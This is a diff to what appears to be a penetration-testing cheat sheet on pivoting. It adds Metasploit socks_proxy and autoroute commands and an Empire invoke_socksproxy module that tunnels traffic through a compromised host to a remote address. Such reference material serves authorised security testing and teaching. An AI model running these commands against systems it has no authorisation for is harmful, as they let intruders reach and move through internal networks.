@@ -138,7 +138,12 @@ or
 
 # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
 run autoroute -s 192.168.15.0/24 
-use auxiliary/server/socks4a
+use auxiliary/server/socks_proxy
+set SRVPORT 9090
+set VERSION 4a
+# or
+use auxiliary/server/socks4a     # (deprecated)
+
 
 # Meterpreter list all active routes
 run autoroute -p 
@@ -150,6 +155,15 @@ route add 192.168.14.0 255.255.255.0 3
 route delete 192.168.14.0 255.255.255.0 3 
 # Meterpreter delete all routes
 route flush 
+```
+
+## Empire
+
+```powershell
+(Empire) > socksproxyserver
+(Empire) > use module management/invoke_socksproxy
+(Empire) > set remoteHost 10.10.10.10
+(Empire) > run
 ```
 
 ## sshuttle
